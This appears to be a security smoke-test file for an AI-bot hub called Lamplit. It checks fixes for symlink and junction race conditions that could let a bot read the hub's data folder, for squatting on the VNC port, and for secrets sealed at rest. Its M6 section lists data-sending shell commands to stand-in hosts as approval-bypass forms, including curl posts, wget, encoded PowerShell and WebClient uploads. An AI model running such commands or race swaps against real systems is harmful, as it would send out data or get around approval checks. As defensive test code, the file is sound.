/**
 * smoke-sec1554.mjs - 1.5.54 security batch (the 11-21 review's M6, M7, L6-L8
 * and the verifier's new lows).
 *
 * M7: the hub checked where a workspace path leads, then read it - two steps.
 * A bot that swaps a folder for a link or junction to Lamplit's data folder
 * between the two got the hub (which can read that folder) to read it. The
 * race test below swaps a folder for a junction as fast as it can while the
 * file route is asked for a file inside it; a single "secret" answer fails it.
 */
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

const SECRET = 'SECRET-FROM-THE-DATA-FOLDER';

/**
 * Swap <ws>/swap between a real folder and a link to <outside> for `ms` while
 * `ask()` reads swap/note.txt. -> {asked, leaked}
 */
export async function swapRace({ workspace, outside, ask, ms = 4000 }) {
  await fsp.mkdir(outside, { recursive: true });
  await fsp.writeFile(path.join(outside, 'note.txt'), SECRET);
  const real = path.join(workspace, 'swap-real');
  const link = path.join(workspace, 'swap-link');
  const swap = path.join(workspace, 'swap');
  await fsp.mkdir(real, { recursive: true });
  await fsp.writeFile(path.join(real, 'note.txt'), 'harmless');
  try { fs.symlinkSync(outside, link, process.platform === 'win32' ? 'junction' : 'dir'); } catch { /* exists */ }
  fs.renameSync(real, swap);
  // The swapper: a separate program in a tight loop, as a bot's background command would be.
  const { spawn } = await import('node:child_process');
  const code = [
    "const fs = require('fs');",
    'const [s, r, l, ms] = process.argv.slice(1);',
    'let real = true;',
    'const end = Date.now() + Number(ms);',
    'while (Date.now() < end) {',
    '  try { if (real) { fs.renameSync(s, r); fs.renameSync(l, s); } else { fs.renameSync(s, l); fs.renameSync(r, s); } real = !real; } catch { /* busy */ }',
    '}',
    'if (!real) { try { fs.renameSync(s, l); fs.renameSync(r, s); } catch { /* best effort */ } }',
  ].join('\n');
  const swapper = spawn(process.execPath, ['-e', code, swap, real, link, String(ms + 500)], { stdio: 'ignore' });
  const swapperDone = new Promise((r) => swapper.on('exit', r));
  let asked = 0;
  let leaked = 0;
  const end = Date.now() + ms;
  while (Date.now() < end) {
    asked += 1;
    const text = await ask('swap/note.txt').catch(() => '');
    if (String(text).includes(SECRET)) leaked += 1;
  }
  await swapperDone;
  // A link or junction goes by itself (never recursively: that would empty its target); a real folder with what is in it.
  for (const p of [swap, real, link]) {
    let st = null;
    try { st = fs.lstatSync(p); } catch { continue; }
    try { if (st.isSymbolicLink()) { if (process.platform === 'win32') fs.rmdirSync(p); else fs.unlinkSync(p); } else fs.rmSync(p, { recursive: true, force: true }); } catch { /* left for the temp folder */ }
  }
  return { asked, leaked };
}

/** M7 through a running hub's file route and through the helper itself. */
export async function m7Checks({ check, base, rawFetch, workspace }) {
  const outside = await fsp.mkdtemp(path.join(os.tmpdir(), 'lamplit-outside-'));
  try {
    const key = (() => { try { return fs.readFileSync(path.join(process.env.ASSIST_DATA_DIR, 'local-key'), 'utf8').trim(); } catch { return ''; } })();
    const viaRoute = await swapRace({ workspace, outside, ask: (p) => rawFetch(`${base}/api/workspace/file?path=${encodeURIComponent(p)}`, { headers: { 'x-lamplit-local': key } }).then((r) => r.text()) });
    check('SEC-M7a the workspace file route never hands out a file a swapped-in link leads to outside the workspace', viaRoute.leaked === 0 && viaRoute.asked > 50, JSON.stringify(viaRoute));
    const S = await import('../src/safefs.mjs');
    const viaTool = await swapRace({ workspace, outside, ms: Number(process.env.SEC_RACE_MS || 4000), ask: (p) => S.readInside(workspace, path.resolve(workspace, p), 'utf8') });
    check('SEC-M7b the bots\' file tools read through the same check (readInside): never the outside file', viaTool.leaked === 0 && viaTool.asked > 50, JSON.stringify(viaTool));
    // A write through a swapped link: nothing changes outside.
    const target = path.join(outside, 'note.txt');
    let wrote = 0;
    try { fs.symlinkSync(outside, path.join(workspace, 'w-link'), process.platform === 'win32' ? 'junction' : 'dir'); } catch { /* exists */ }
    try { await S.writeInside(workspace, path.join(workspace, 'w-link', 'note.txt'), 'overwritten'); wrote = 1; } catch { /* refused */ }
    try { fs.rmdirSync(path.join(workspace, 'w-link')); } catch { /* gone */ }
    check('SEC-M7c a write through a link to outside is refused before anything outside is changed', !wrote && fs.readFileSync(target, 'utf8') === SECRET);
  } finally {
    await fsp.rm(outside, { recursive: true, force: true }).catch(() => {});
  }
}

/** Remove a folder made for a test: links and junctions by themselves first (never recursively into what they lead to). */
function dropTestFolder(dir) {
  const walk = (p) => {
    let entries = [];
    try { entries = fs.readdirSync(p, { withFileTypes: true }); } catch { return; }
    for (const e of entries) {
      const q = path.join(p, e.name);
      let st = null;
      try { st = fs.lstatSync(q); } catch { continue; }
      if (st.isSymbolicLink()) { try { if (process.platform === 'win32') fs.rmdirSync(q); else fs.unlinkSync(q); } catch { try { fs.unlinkSync(q); } catch { /* left */ } } } else if (st.isDirectory()) walk(q);
    }
  };
  walk(dir);
  fs.rmSync(dir, { recursive: true, force: true });
}

/**
 * The verifier's 1.5.54 M7 cases A-F, in a child program with its own data
 * folder (the undo store lives there): a junction made beforehand (file_fetch),
 * a folder swapped between the workspace and the data folder while fs_write,
 * fs_delete and new-file writes run, and a planted undo record. -> results
 */
async function m7RaceChild(T) {
  const { createRegistry } = await import('../src/tools.mjs');
  const { undoChanges } = await import('../src/trash.mjs');
  const { writeInside } = await import('../src/safefs.mjs');
  const { spawn } = await import('node:child_process');
  const ws = path.join(T, 'ws');
  const data = process.env.ASSIST_DATA_DIR;
  const N = Number(process.env.SEC_RACE_N || 150);
  const kind = process.platform === 'win32' ? 'junction' : 'dir';
  const reset = () => {
    if (fs.existsSync(ws)) dropTestFolder(ws);
    fs.mkdirSync(ws, { recursive: true });
    fs.mkdirSync(data, { recursive: true });
    fs.writeFileSync(path.join(data, 'note.txt'), SECRET);
    fs.writeFileSync(path.join(data, 'local-key'), 'a'.repeat(64));
  };
  const out = {};
  const peers = { find: (n) => (n === 'B' ? { name: 'B' } : null), call: async () => new Response('b'.repeat(64)), list: () => [{ name: 'B' }] };
  const reg = createRegistry({ getPeers: () => peers });
  const ctx = { workspaceDir: ws, botId: 'bot1', bot: { id: 'bot1' } };

  // A: file_fetch into a folder that is a junction to the data folder, made beforehand.
  reset();
  const day = new Date().toISOString().slice(0, 10);
  fs.mkdirSync(path.join(ws, 'from-machines', 'B'), { recursive: true });
  fs.symlinkSync(data, path.join(ws, 'from-machines', 'B', day), kind);
  try { await reg.get('file_fetch').run({ machine: 'B', path: 'local-key' }, ctx); } catch { /* refused */ }
  out.A = fs.readFileSync(path.join(data, 'local-key'), 'utf8') === 'a'.repeat(64);

  // B, C, E2: ws/d flips between a junction to ws/d_real and one to the data folder.
  const trashHasSecret = () => {
    let found = false;
    const walk = (p) => { let es = []; try { es = fs.readdirSync(p, { withFileTypes: true }); } catch { return; } for (const e of es) { const q = path.join(p, e.name); if (e.isSymbolicLink()) continue; if (e.isDirectory()) walk(q); else { try { if (fs.readFileSync(q, 'utf8').includes(SECRET)) found = true; } catch { /* racing */ } } } };
    walk(path.join(ws, '.trash'));
    return found;
  };
  const race = async (fn) => {
    reset();
    fs.mkdirSync(path.join(ws, 'd_real'));
    fs.writeFileSync(path.join(ws, 'd_real', 'note.txt'), 'harmless');
    const code = [
      "const fs = require('fs');",
      'const [dir, real, target, kind] = process.argv.slice(1);',
      'let stuck = 0;',
      'for (;;) { for (const to of [real, target]) {',
      '  try { const st = fs.lstatSync(dir); if (st.isSymbolicLink()) { try { fs.rmdirSync(dir); } catch { fs.unlinkSync(dir); } } else fs.renameSync(dir, dir + "_stuck" + stuck++); } catch { /* gone */ }',
      '  try { fs.symlinkSync(to, dir, kind); } catch { /* busy */ }',
      '  const t = performance.now(); while (performance.now() - t < 0.3);',
      '} }',
    ].join('\n');
    const sw = spawn(process.execPath, ['-e', code, path.join(ws, 'd'), path.join(ws, 'd_real'), data, kind], { stdio: 'ignore' });
    await new Promise((r) => setTimeout(r, 200));
    let hits = 0;
    for (let i = 0; i < N; i += 1) { try { await fn(i); } catch { /* refused */ } if (trashHasSecret()) hits += 1; }
    sw.kill();
    await new Promise((r) => sw.on('exit', r));
    return hits;
  };
  out.B = (await race(() => reg.get('fs_write').run({ path: 'd/note.txt', content: 'new text' }, ctx))) === 0 && fs.readFileSync(path.join(data, 'note.txt'), 'utf8') === SECRET;
  // C in two parts (1.5.59): nothing copied into .trash (the copy goes through a checked handle:
  // everywhere), and the data file neither moved nor removed (a move of the bot's names: on Linux
  // through the held-open folder; on Windows only with the bots' account, SEC-R2/R3 - without it
  // the bots run as the human, and Windows' two lookups of a move can lose here now and then).
  out.Ccopy = (await race(() => reg.get('fs_delete').run({ path: 'd/note.txt' }, ctx))) === 0;
  out.Cdata = fs.existsSync(path.join(data, 'note.txt')) && fs.readFileSync(path.join(data, 'note.txt'), 'utf8') === SECRET;
  out.C = out.Ccopy && out.Cdata;
  await race((i) => writeInside(ws, path.join(ws, 'd', `new-${i}.txt`), 'x'));
  out.E2 = fs.readdirSync(data).filter((f) => f.startsWith('new-')).length === 0 && fs.readFileSync(path.join(data, 'note.txt'), 'utf8') === SECRET;

  // F: an undo record the bot wrote into the workspace, and a junction where it points.
  reset();
  const id = `${new Date().toISOString().slice(0, 10).replace(/-/g, '')}-abc123`;
  const kept = path.join(ws, '.trash', id.slice(0, 8), id);
  fs.mkdirSync(kept, { recursive: true });
  fs.writeFileSync(path.join(kept, 'content'), 'c'.repeat(64));
  fs.writeFileSync(path.join(ws, '.trash', id.slice(0, 8), `${id}.json`), JSON.stringify({ id, ws, kind: 'write', rel: 'j/local-key', existed: true, undone: false }));
  fs.symlinkSync(data, path.join(ws, 'j'), kind);
  const undone = await undoChanges(ws, [id]);
  out.F = !undone[0]?.ok && fs.readFileSync(path.join(data, 'local-key'), 'utf8') === 'a'.repeat(64);
  dropTestFolder(ws);
  return out;
}

/** M7 A-F (the verifier's cases), each in a fresh child program. */
export async function m7RaceChecks({ check }) {
  const { spawnSync } = await import('node:child_process');
  const T = fs.mkdtempSync(path.join(os.tmpdir(), 'm7race-'));
  try {
    const me = new URL(import.meta.url);
    const r = spawnSync(process.execPath, [me.pathname.replace(/^\/([A-Za-z]:)/, '$1'), '--m7-race', T], { env: { ...process.env, ASSIST_HOME: T, ASSIST_DATA_DIR: path.join(T, 'data'), ASSIST_WORKSPACE_DIR: path.join(T, 'ws'), ASSIST_MASTER_KEY: '' }, encoding: 'utf8', timeout: 240000 });
    let got = {};
    try { got = JSON.parse(String(r.stdout || '').trim().split(/\r?\n/).pop()); } catch { /* none */ }
    check('SEC-M7d file_fetch into a folder that is a junction to the data folder changes nothing there (A)', got.A === true, `${r.stdout}${r.stderr}`.slice(-600));
    check('SEC-M7e fs_write and fs_delete under a folder swapped to the data folder: no data file is copied into the workspace (B, C); none is moved or removed (C: on Linux; on Windows that needs the bots\' account, SEC-R2/R3)',
      got.B === true && got.Ccopy === true && (got.Cdata === true || process.platform === 'win32'), JSON.stringify(got));
    check('SEC-M7f a refused new-file write leaves no empty file in the data folder (E2)', got.E2 === true, JSON.stringify(got));
    check('SEC-M7g an undo record written into the workspace is not used: 撤销 writes nothing through a junction (F)', got.F === true, JSON.stringify(got));
  } finally {
    dropTestFolder(T);
  }
}

/** A hub child on a temp home (Windows screen at `vncPort`), with `secret` in its data folder or none. -> {base, key, stop()} */
async function screenHub({ vncPort, secret = null, env = {} }) {
  const { spawn } = await import('node:child_process');
  const REPO = path.resolve(path.dirname(new URL(import.meta.url).pathname.replace(/^\/([A-Za-z]:)/, '$1')), '..');
  const home = await fsp.mkdtemp(path.join(os.tmpdir(), 'vnc1554-'));
  for (const d of ['config', 'skills', 'public']) await fsp.cp(path.join(REPO, d), path.join(home, d), { recursive: true });
  await fsp.mkdir(path.join(home, 'data'), { recursive: true });
  if (secret) await fsp.writeFile(path.join(home, 'data', 'tightvnc.json'), JSON.stringify(secret));
  const proc = spawn(process.execPath, [path.join(REPO, 'src', 'server.mjs')], { env: { ...process.env, ASSIST_HOME: home, ASSIST_DATA_DIR: path.join(home, 'data'), ASSIST_WORKSPACE_DIR: path.join(home, 'workspace'), PORT: '0', DESK_VNC_PORT: String(vncPort), DESK_SCREEN_WATCH: '0', DESK_CLI_WATCH: '0', DESK_VNC_SECURE: '0', ASSIST_MODEL_PROVIDER: 'mock', ASSIST_MASTER_KEY: '', DESK_VNC_TRUST_PATH: '', ...env }, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
  const ready = await new Promise((resolve, reject) => {
    let out = '';
    const t = setTimeout(() => reject(new Error('hub did not start')), 30000);
    proc.stdout.on('data', (c) => { out += c; for (const l of out.split('\n')) { try { const j = JSON.parse(l); if (j.event === 'ready') { clearTimeout(t); resolve(j); } } catch { /* partial */ } } });
    proc.on('exit', (c) => reject(new Error(`hub exited ${c}`)));
  });
  await new Promise((r) => setTimeout(r, 1500));
  const key = fs.readFileSync(path.join(home, 'data', 'local-key'), 'utf8').trim();
  return {
    base: `http://127.0.0.1:${ready.port}`, port: ready.port, key,
    stop: async () => { proc.kill(); await new Promise((r) => setTimeout(r, 500)); await fsp.rm(home, { recursive: true, force: true }).catch(() => {}); },
  };
}

/** The verifier's two new lows on the Windows screen (1.5.54). */
export async function vncLowChecks({ check }) {
  if (process.platform !== 'win32') { console.log('SKIP  SEC-VNC (Windows only)'); return; }
  const V = await import('../src/vncauth.mjs');
  const L = await import('../src/localvnc.mjs');
  const { mockVnc, wsClient, pageSession } = await import('./smoke-vnc1553.mjs');
  const secret = V.newVncSecret();
  const squatter = await mockVnc({ password: secret.password }); // a program (node.exe) holding the screen's port
  const dir = await fsp.mkdtemp(path.join(os.tmpdir(), 'vnc1554-secure-'));
  try {
    check('SEC-VNC-1 the screen port\'s listener is checked: a program that is not TightVNC is "other", an empty port "down"; TightVNC\'s own places are trusted',
      L.vncListenerTrusted(squatter.port) === 'other' && L.vncListenerTrusted(1) === 'down' && L.vncListenerTrusted(squatter.port, { paths: [process.execPath] }) === 'trusted'
      && L.trustedVncPaths('C:\\Lamplit').some((p) => p.endsWith('\\lamplit\\vnc\\pfiles\\tightvnc\\tvnserver.exe')));
    // The verifier's follow-ups: a trusted program run by another account (the bots' one) is not
    // trusted; an owner that cannot be read is not either; the tests' extra path is for tests only.
    const keepTest = process.env.ASSIST_TEST;
    const keepPath = process.env.DESK_VNC_TRUST_PATH;
    process.env.DESK_VNC_TRUST_PATH = 'C:\\Users\\Public\\tvnserver.exe';
    delete process.env.ASSIST_TEST;
    const notInRealInstall = !L.trustedVncPaths('').includes('c:\\users\\public\\tvnserver.exe');
    process.env.ASSIST_TEST = '1';
    const inTests = L.trustedVncPaths('').includes('c:\\users\\public\\tvnserver.exe');
    if (keepTest === undefined) delete process.env.ASSIST_TEST; else process.env.ASSIST_TEST = keepTest;
    if (keepPath === undefined) delete process.env.DESK_VNC_TRUST_PATH; else process.env.DESK_VNC_TRUST_PATH = keepPath;
    const otherAccount = L.vncListenerTrusted(squatter.port, { paths: [process.execPath], me: () => 'S-1-5-21-1-2-3-4242' });
    const unreadable = L.vncListenerTrusted(squatter.port, { paths: [process.execPath], me: () => 'S-1-5-21-1-2-3-4243', info: (pids) => Object.fromEntries(pids.map((p) => [p, { exe: process.execPath, sid: '' }])) });
    check('SEC-VNC-1b TightVNC started by another account (the bots\') is not trusted, nor one whose owner cannot be read; DESK_VNC_TRUST_PATH only counts with ASSIST_TEST=1',
      otherAccount === 'other' && unreadable === 'other' && notInRealInstall && inTests, JSON.stringify({ otherAccount, unreadable, notInRealInstall, inTests }));
    const before = squatter.auths.length;
    const r = await L.secureTightVnc({ dataDir: dir, service: true, key: null, port: squatter.port, runPs: () => 'DESK_VNC_OK', restart: async () => {} });
    check('SEC-VNC-2 setting the password stops when the port is held by another program, before any password answer is sent to it', r.state === 'failed' && /占着/.test(r.reason || '') && squatter.auths.length === before, JSON.stringify({ r: r.state, why: r.reason, auths: squatter.auths.length - before }));

    const hub = await screenHub({ vncPort: squatter.port, secret });
    try {
      const page = await wsClient(`ws://127.0.0.1:${hub.port}/api/bots/chief/desktop/ws`, { origin: hub.base, 'x-lamplit-local': hub.key }).then(() => 'opened', (e) => e.status);
      const item = ((await (await fetch(`${hub.base}/api/checkup`, { headers: { 'x-lamplit-local': hub.key } })).json()).items || []).find((i) => i.id === 'vnc');
      check('SEC-VNC-3 the hub never signs in to a program squatting the screen\'s port (no challenge answered: nothing to break offline, no fake screen); 体检 says so',
        page === 502 && squatter.auths.length === before && item?.state === 'bad', JSON.stringify({ page, auths: squatter.auths.length - before, item: item?.state }));
    } finally { await hub.stop(); }
  } finally {
    await squatter.close();
    await fsp.rm(dir, { recursive: true, force: true }).catch(() => {});
  }

  // The human's own TightVNC password: kept, not nagged about, replaced only when they say so.
  const theirs = await mockVnc({ password: 'MyOwnPw1' });
  const hub = await screenHub({ vncPort: theirs.port, env: { ASSIST_TEST: '1', DESK_VNC_TRUST_PATH: process.execPath } });
  try {
    const item = ((await (await fetch(`${hub.base}/api/checkup`, { headers: { 'x-lamplit-local': hub.key } })).json()).items || []).find((i) => i.id === 'vnc');
    const quiet = await fetch(`${hub.base}/api/desktop/secure-vnc`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-lamplit-local': hub.key }, body: '{}' });
    const page = await pageSession(await wsClient(`ws://127.0.0.1:${hub.port}/api/bots/chief/desktop/ws`, { origin: hub.base, 'x-lamplit-local': hub.key }));
    check('SEC-VNC-4 a TightVNC with the human\'s own password: 体检 is green and offers (not urges) a switch, which asks first; nothing is replaced without "replace"; the page asks for their password',
      item?.state === 'ok' && item?.action?.replace === true && quiet.status === 409 && (await quiet.json())?.error?.code === 'VNC_OWN_PASSWORD' && page.types.join() === '2',
      JSON.stringify({ item, quiet: quiet.status, types: page.types }));
  } finally {
    await hub.stop();
    await theirs.close();
  }
}

/** M6: sends that have no draft card ask too; connected-app sends are found in camelCase names. */
export async function m6Checks({ check, readText }) {
  const D = await import('../src/drafts.mjs');
  check('SEC-M6a connected-app sends are found whatever the name\'s style (sendMessage, chat.postMessage, createIssueComment, notifyUser), looks are not',
    ['sendMessage', 'chat.postMessage', 'createIssueComment', 'slack_post_message', 'mcp__slack__chat_postMessage', 'notifyUser'].every((n) => D.isSendingTool(n))
    && !['getMessages', 'listPosts', 'searchComments', 'readEmail', 'fetchThread'].some((n) => D.isSendingTool(n)));
  const shell = (command) => D.outgoingAsk('shell', { command });
  check('SEC-M6b a command that posts or mails out asks every time; looking, local services and copying files do not',
    Boolean(shell('curl -X POST https://api.x.com/2/tweets -d @t.json')) && Boolean(shell('Invoke-RestMethod -Uri https://hooks.slack.com/x -Method Post -Body $b')) && Boolean(shell('echo hi | mail -s s a@b.c'))
    && Boolean(shell("python -c \"import requests; requests.post('https://x.example', data=1)\""))
    && !shell('curl https://example.com') && !shell('curl -d a=1 http://127.0.0.1:8080/x') && !shell('ls -la'));
  check('SEC-M6c a connected app\'s send with no text field to show, and a form posted to a website, ask every time',
    Boolean(D.outgoingAsk('mcp__x__sendMessage', { recipient: 'a', payload: 'b' }, { mcp: { server: 'x', tool: 'sendMessage' } }))
    && Boolean(D.outgoingAsk('http_fetch', { method: 'POST', url: 'https://x.example/a' })) && !D.outgoingAsk('http_fetch', { method: 'POST', url: 'http://localhost:3000/a' }) && !D.outgoingAsk('http_fetch', { method: 'GET', url: 'https://x.example' }));
  // The verifier's bypass forms (1.5.54 re-check): option clusters, --json, proxies and --connect-to on a
  // "local" address, wget, PowerShell abbreviations and colon syntax, WebClient, urllib/httpx, fetch POST,
  // gh, and -EncodedCommand. Looks, downloads and local services stay quiet.
  const enc = (s) => Buffer.from(s, 'utf16le').toString('base64');
  const sends = [
    'curl -sd a=1 https://x.example/a', 'curl -sSfd @b.json https://x.example/a', 'curl --json {} https://x.example/a',
    'curl -d a=1 --connect-to 127.0.0.1:80:x.example:443 http://127.0.0.1/', 'curl -d a=1 --proxy http://p:3128 http://localhost/x', 'curl -d a=1 -x http://p:3128 http://localhost/x',
    'wget --method=POST https://x.example', 'wget --post-data a=1 https://x.example',
    'irm https://x.example -Me Post -Bo $b', 'iwr -Method:Post https://x.example', '(New-Object Net.WebClient).UploadString("https://x.example","a")',
    'python -c "import urllib.request as u; u.urlopen(\'https://x.example\', data=b\'a\')"', 'python -c "import httpx; httpx.post(\'https://x.example\')"',
    "node -e \"fetch('https://x.example',{method:'POST',body:'a'})\"", 'gh api -X POST repos/a/b/issues -f title=t', 'gh issue create -t t -b b',
    `powershell -EncodedCommand ${enc("Invoke-RestMethod https://x.example -Method Post -Body 'a'")}`, `powershell -enc ${enc('iwr https://x.example -B a')}`,
  ];
  const quiet = ['curl https://example.com', 'curl -sSfL -o f.zip https://example.com/f.zip', 'curl -D h.txt https://example.com', 'curl -d a=1 http://127.0.0.1:8080/x', 'irm https://x.example', 'gh issue list', `powershell -enc ${enc('Get-ChildItem')}`];
  const missed = sends.filter((c) => !shell(c));
  const asked = quiet.filter((c) => shell(c));
  check('SEC-M6e the verifier\'s bypass forms all ask (curl clusters, --json, proxy on a local address, wget, PowerShell short and colon forms, WebClient, urllib, httpx, fetch, gh, -EncodedCommand); looks and downloads do not',
    !missed.length && !asked.length, JSON.stringify({ missed, asked }));
  const mcpSends = ['create_issue', 'update_comment', 'share_file', 'upload_file', 'invite_user', 'submitForm', 'messages_create', 'createIssue', 'updatePost'];
  const mcpReads = ['list_issues', 'get_page', 'searchMessages', 'read_file', 'create_directory', 'update_page', 'create_page'];
  check('SEC-M6f connected-app steps that publish (create_issue, update_comment, share, upload, invite, submit, messages_create) are sends; reads, create_directory and a Notion page edit (update_page, create_page: a document, not a send) are not',
    mcpSends.every((n) => D.isSendingTool(n)) && !mcpReads.some((n) => D.isSendingTool(n)), JSON.stringify({ missed: mcpSends.filter((n) => !D.isSendingTool(n)), flagged: mcpReads.filter((n) => D.isSendingTool(n)) }));
  check('SEC-M6g a remembered 「以后都允许」 never covers a network program used with an address (curl, python, node, PowerShell -enc); plain commands it does',
    !D.rememberMayCover('shell', { command: 'curl https://x.example' }) && !D.rememberMayCover('shell', { command: 'python -c "import requests" https://x.example' })
    && !D.rememberMayCover('shell', { command: `powershell -enc ${enc('Get-ChildItem')}` }) && D.rememberMayCover('shell', { command: 'ls -la' }) && D.rememberMayCover('shell', { command: 'python a.py' }));
  const ag = await readText('../src/agent.mjs');
  check('SEC-M6d the agent asks for those after the draft check, at any level and whatever 「以后都允许」 said, and offers no 「以后都允许」 on them',
    ag.includes('const sendsWithoutDraft = !draft && verdict.decision !== DECISION.DENY ? outgoingAsk(name, args, { mcp: tool.mcp || null }) : \'\';')
    && ag.includes('const offered = batch || draft || sendsWithoutDraft ? null : remember;') && ag.includes('&& rememberMayCover(name, args)) {'));
}

/** L6 (secrets sealed at rest), L7 (the firewall fix), L8 is in smoke-1551. */
export async function lowChecks({ check, readText }) {
  const S = await import('../src/store.mjs');
  check('SEC-L6a this hub\'s token and pairing code, the other machines\' tokens, the relay\'s key and join secret and the screen\'s passwords are sealed with the desktop app\'s key',
    ['security.json', 'peers.json', 'relay-link.json', 'tightvnc.json'].every((n) => S.SEALED_FILES.has(n)));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sealed-'));
  const prev = process.env.ASSIST_MASTER_KEY;
  try {
    const key = Buffer.from('11'.repeat(32), 'hex');
    const file = path.join(dir, 'security.json');
    fs.writeFileSync(file, S.sealText(JSON.stringify({ token: 'abc' }), key));
    process.env.ASSIST_MASTER_KEY = '11'.repeat(32);
    const openable = S.sealedButLocked(file);
    delete process.env.ASSIST_MASTER_KEY;
    const locked = S.sealedButLocked(file);
    const auth = await readText('../src/auth.mjs');
    check('SEC-L6b a sealed file this run cannot open (started without the desktop app) is never overwritten: security.json gets a temporary token in memory, the relay settings are not saved',
      !openable && locked && auth.includes('if (sealedButLocked(P.securityFile)) {') && auth.includes('if (security.temporary) return Promise.resolve();')
      && (await readText('../src/relaylink.mjs')).includes("if (sealedButLocked(file)) { log('relay-link.json is sealed with the desktop app key: not saved in this run'); return; }"));
    // The verifier's follow-up: with ANOTHER key (not none) the file was written over too.
    const before = fs.readFileSync(file, 'utf8');
    const refused = async (write) => { try { await write(); return 'written'; } catch (err) { return err.code; } };
    process.env.ASSIST_MASTER_KEY = '22'.repeat(32);
    const wrongAsync = await refused(() => S.writeJsonAtomic(file, { token: 'new' }));
    const wrongSync = await refused(() => S.writeJsonSyncAtomic(file, { token: 'new' }));
    delete process.env.ASSIST_MASTER_KEY;
    const noKey = await refused(() => S.writeJsonAtomic(file, { token: 'new' }));
    const intact = fs.readFileSync(file, 'utf8') === before;
    process.env.ASSIST_MASTER_KEY = '11'.repeat(32);
    const rightKey = await refused(() => S.writeJsonAtomic(file, { token: 'new' }));
    check('SEC-L6c a sealed file is written over only with the key that opens it: another key or none is refused (both writers), the file left as it was',
      wrongAsync === 'SEALED_NO_KEY' && wrongSync === 'SEALED_NO_KEY' && noKey === 'SEALED_NO_KEY' && intact && rightKey === 'written',
      JSON.stringify({ wrongAsync, wrongSync, noKey, intact, rightKey }));
  } finally {
    if (prev === undefined) delete process.env.ASSIST_MASTER_KEY; else process.env.ASSIST_MASTER_KEY = prev;
    fs.rmSync(dir, { recursive: true, force: true });
  }
  const main = await readText('../desktop/main.mjs');
  check('SEC-L7 the firewall fix runs Windows\' own PowerShell by its full path (also elevated), and removes only Block rules Windows made for Lamplit, not the user\'s own',
    main.includes("const POWERSHELL = path.join(process.env.SystemRoot || 'C:\\\\Windows', 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe');") && main.includes('child = spawn(POWERSHELL,')
    && main.includes("Start-Process (Join-Path $env:SystemRoot 'System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe') -Verb RunAs")
    && main.includes("$_.Action -eq 'Block' -and $_.DisplayName -match '^(Lamplit|Evenlight|Nightshift)'") && !/spawn\('powershell\.exe'/.test(main));
}

// The child program for m7RaceChecks (its own data folder, set by the parent).
if (process.argv[2] === '--m7-race') {
  const result = await m7RaceChild(process.argv[3]);
  console.log(JSON.stringify(result));
  process.exit(0);
}
